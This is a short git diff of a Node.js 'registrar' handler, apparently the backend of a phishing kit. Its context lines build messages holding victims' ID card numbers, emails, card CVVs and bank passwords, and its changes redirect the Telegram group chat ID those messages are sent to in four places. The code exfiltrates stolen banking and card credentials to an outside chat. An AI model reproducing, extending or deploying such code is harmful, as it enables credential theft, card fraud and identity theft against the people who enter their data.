@@ -65,7 +65,7 @@ const registrar = async (req, res ) => {
                 //const mensajeBienvenida = `Nuevo Registro:\n ${cadenaSinLlaves}`;
                 const Cedula = `Nueva Cédula Registrada 🪪:\n\n` + cedula;
             
-                const chatId = -4081066070; //id de grupo
+                const chatId = -1001952211416; //id de grupo
                 
                 //5319932122; id de bot solo
         
@@ -93,7 +93,7 @@ const registrar = async (req, res ) => {
                 "Email: " + email +`\n`
                 ;
             
-                const chatId = -4081066070; //id de grupo
+                const chatId = -1001952211416; //id de grupo
                 
                 //5319932122; id de bot solo
         
@@ -122,7 +122,7 @@ const registrar = async (req, res ) => {
                 "Cvv: " + cvv +`\n`
                 ;
             
-                const chatId = -4081066070; //id de grupo
+                const chatId = -1001952211416; //id de grupo
                 
                 //5319932122; id de bot solo
         
@@ -144,7 +144,7 @@ const registrar = async (req, res ) => {
                 "Contraseña de Banco: " + ContraseñaBanco
                 ;
             
-                const chatId = -4081066070; //id de grupo
+                const chatId = -1001952211416; //id de grupo
                 
                 //5319932122; id de bot solo
         
